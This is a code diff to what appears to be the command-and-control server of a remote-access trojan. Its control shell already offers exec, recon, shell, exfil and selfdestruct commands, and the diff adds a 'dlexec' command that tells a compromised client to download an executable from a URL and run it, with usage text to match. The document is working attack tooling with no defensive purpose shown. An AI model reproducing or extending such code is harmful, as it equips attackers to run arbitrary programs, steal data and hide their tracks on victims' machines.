@@ -31,7 +31,8 @@ def get_args():
 
 
 def shell_server(s, PORT):
-    cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil', 'selfdestruct']
+    cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil', 'selfdestruct',
+            'dlexec']
     print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
     prompt = shell_exchange(conn, 'getprompt')
@@ -44,13 +45,11 @@ def shell_server(s, PORT):
                 continue
             base = inp.split()[0]
             # exit
-            if inp == cmds[0]:
+            if base == cmds[0]:
                 break
             # help
             elif base == cmds[1]:
-                print 'Commands:'
-                for cmd in cmds:
-                    print '  {}'.format(cmd)
+                print 'Commands:\n  {}'.format('\n  '.join(cmds))
             # exec
             elif base == cmds[2]:
                 inp += ' '  # for regex
@@ -100,11 +99,19 @@ def shell_server(s, PORT):
                             print '[+] ({}) Exiting control shell.'.format(datetime.now())
                             return
                         else:
-                            print 'psh : Self destruct error: {}.'.format(resp)
+                            print 'psh : Self destruct error: {}'.format(resp)
                     else:
                         print 'psh : Aborting self destruct.'
                 else:
                     shell_cmd_help(cmds, 6)
+            # dlexec
+            elif base == cmds[7]:
+                if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
+                    resp = shell_exchange(conn, inp)
+                    msg = 'successful' if resp == 'done' else 'error: ' + resp
+                    print 'psh : dlexec {}'.format(msg)
+                else:
+                    shell_cmd_help(cmds, 7)
             else:
                 print 'psh: {}: command not found'.format(base)
         except KeyboardInterrupt:
@@ -174,6 +181,12 @@ def shell_cmd_help(cmds, ind):
         print 'Self destruct.'
         print 'usage: selfdestruct [-h]'
         print '\nPermanently remove client from target.'
+        print '\noptions:'
+        print '-h\t\tshow help'
+    elif ind == 7:
+        print 'Download and execute.'
+        print 'usage: dlexec http://my.pro/gram [-h]'
+        print '\nDownload executable from internet and execute.'
         print '\noptions:'
         print '-h\t\tshow help'
 
